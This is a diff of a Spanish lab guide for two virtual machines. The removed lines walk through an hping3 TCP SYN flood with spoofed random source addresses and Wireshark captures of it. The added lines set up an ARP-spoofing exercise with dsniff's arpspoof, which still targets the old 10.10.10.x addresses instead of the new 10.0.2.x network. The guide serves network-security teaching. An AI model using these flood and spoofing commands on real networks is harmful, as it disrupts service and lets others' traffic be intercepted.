@@ -1,49 +1,68 @@
-Flood: La palabra "flood" en inglés se traduce al español como "inundación". En el contexto de la tecnología y las redes informáticas, se utiliza para describir una sobreabundancia de datos o solicitudes enviadas a una red o sistema, con el objetivo de abrumarlo y causar una falla o denegación de servicio.
+Este laboratorio necesita una red nat que compartirán las máquinas virtuales.
+
 
 Este laboratorio cuenta con dos máquina virtuales:
-- Windows 10 con configuración de la red: red interna. IP 10.10.10.5
-- Ubuntu 23.10 con configuración de la red: red interna. IP: 10.10.10.3
+- Windows 10 con configuración de la red: red nat. IP 10.0.2.15
+- Ubuntu 23.10 con configuración de la red: red nat. IP: 10.0.2.4
 
-Comprobamos que las máquina virtuales se vean haciendo un ping:
-![](capturas/ping.png)
-![](capturas/ping.win.png)
+Comprobamos que la máquina virtual linux vea a la windows:
+```
+ping 10.0.2.15
+PING 10.0.2.15 (10.0.2.15) 56(84) bytes of data.
+64 bytes from 10.0.2.15: icmp_seq=1 ttl=128 time=0.942 ms
+64 bytes from 10.0.2.15: icmp_seq=2 ttl=128 time=0.509 ms
+64 bytes from 10.0.2.15: icmp_seq=3 ttl=128 time=0.995 ms
+^C
+--- 10.0.2.15 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2043ms
+rtt min/avg/max/mdev = 0.509/0.815/0.995/0.217 ms
+```
 
+
+Comprobamos que la máquina virtual windows vea a la Linux:
+```
+C:\Windows\system32>ping 10.0.2.4
+Haciendo ping a 10.0.2.4 con 32 bytes de datos:
+Respuesta desde 10.0.2.4: bytes=32 tiempo<1m TTL=64
+Respuesta desde 10.0.2.4: bytes=32 tiempo=1ms TTL=64
+Respuesta desde 10.0.2.4: bytes=32 tiempo=1ms TTL=64
+Respuesta desde 10.0.2.4: bytes=32 tiempo=1ms TTL=64
+
+Estadísticas de ping para 10.0.2.4:
+    Paquetes: enviados = 4, recibidos = 4, perdidos = 0
+    (0% perdidos),
+Tiempos aproximados de ida y vuelta en milisegundos:
+    Mínimo = 0ms, Máximo = 1ms, Media = 0ms
+```
 
 En la máquina Windows:
 - No hace falta desactivar el antivirus de Windows. Funciona igualmente.
 - Abrimor Wireshark  para snifar el tráfico.
 
-En la máquina Linux instalamos hping3 y lanzamos el ataque unos segundos:
+
+
+En la máquina Linux instalamos dsniff y lanzamos el ataque unos segundos:
 ```
-sudo apt-get install hping3
-sudo hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 10.10.10.5
+sudo apt-get install dsniff
+sudo apt install nmap
+sudo nmap --iflist
+[sudo] contraseña para usuario: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 20:29 CET
+************************INTERFACES************************
+DEV     (SHORT)   IP/MASK       TYPE     UP MTU   MAC
+lo      (lo)      127.0.0.1/8   loopback up 65536
+lo      (lo)      ::1/128       loopback up 65536
+enp0s3  (enp0s3)  10.0.2.4/24   ethernet up 1500  08:00:27:AB:BD:F3
+docker0 (docker0) 172.17.0.1/16 ethernet up 1500  02:42:1B:03:99:67
+
+**************************ROUTES**************************
+DST/MASK       DEV     METRIC GATEWAY
+10.0.2.0/24    enp0s3  100
+172.17.0.0/16  docker0 0
+169.254.0.0/16 enp0s3  1000
+0.0.0.0/0      enp0s3  100    10.0.2.1
+::1/128        lo      0
+::1/128        lo      256
+sudo arpspoof -i [interfaz] -t [víctima] [puerta de enlace]
+sudo arpspoof -i enp0s3 -t 10.10.10.5 10.10.10.1
 ```
-Este comando está diseñado para enviar una gran cantidad de solicitudes SYN TCP al puerto 80 de la dirección IP 10.10.10.5, utilizando direcciones IP de origen aleatorias. Este tipo de ataque se conoce como un ataque de inundación SYN y puede utilizarse para sobrecargar un servidor objetivo, potencialmente causando una denegación de servicio para los usuarios legítimos.
--c 15000: Envía 15000 paquetes.
--d 120: Tamaño de cada paquete de 120 bytes.
--S: Establece el bit de SYN en los paquetes TCP, lo que es común en el establecimiento de una conexión TCP.
--w 64: Tamaño de ventana TCP de 64.
--p 80: Número de puerto de destino, 80 es el puerto HTTP estándar.
---flood: Envía paquetes lo más rápido posible sin esperar respuestas.
---rand-source: Utiliza direcciones IP de origen aleatorias.
-10.10.10.5: La dirección IP del objetivo del ataque.
-![](capturas/Dos-1.png)
-
-
-Comprobamos en Wireshark el ataque:
-![](capturas/wireshark-Dos-Attack.png)
-
-```
-117	53.374939	113.237.38.92	10.10.10.5	TCP	174	1528 → 80 [SYN] Seq=0 Win=64 Len=120 [TCP segment of a reassembled PDU]
-118	53.374939	72.210.92.205	10.10.10.5	TCP	174	1529 → 80 [SYN] Seq=0 Win=64 Len=120 [TCP segment of a reassembled PDU]
-119	53.374939	44.242.130.118	10.10.10.5	TCP	174	1530 → 80 [SYN] Seq=0 Win=64 Len=120 [TCP segment of a reassembled PDU]
-120	53.374939	33.240.239.31	10.10.10.5	TCP	174	1531 → 80 [SYN] Seq=0 Win=64 Len=120 [TCP segment of a reassembled PDU]
-121	53.374939	203.148.209.97	10.10.10.5	TCP	174	1532 → 80 [SYN] Seq=0 Win=64 Len=120 [TCP segment of a reassembled PDU]
-```
-
-Dentro de Wireshark --> Estadísticas --> Conversaciones --> Vemos en escasos segundos la cantidad de información que ha recibido:
-![](capturas/TCP-syn-flood-attack-conversations.png)
-
-
-Dentro de Wireshark --> Estadísitcas --> Jerarqía de Protocolo --> Examinamos el valor estadístico de cada protocolo. La captura de pantalla a continuación muestra un volumen inusualmente alto de paquetes TCP, lo que indica fuertemente un ataque de inundación TCP SYN.
-![](capturas/jerarquia-protocolo.png)
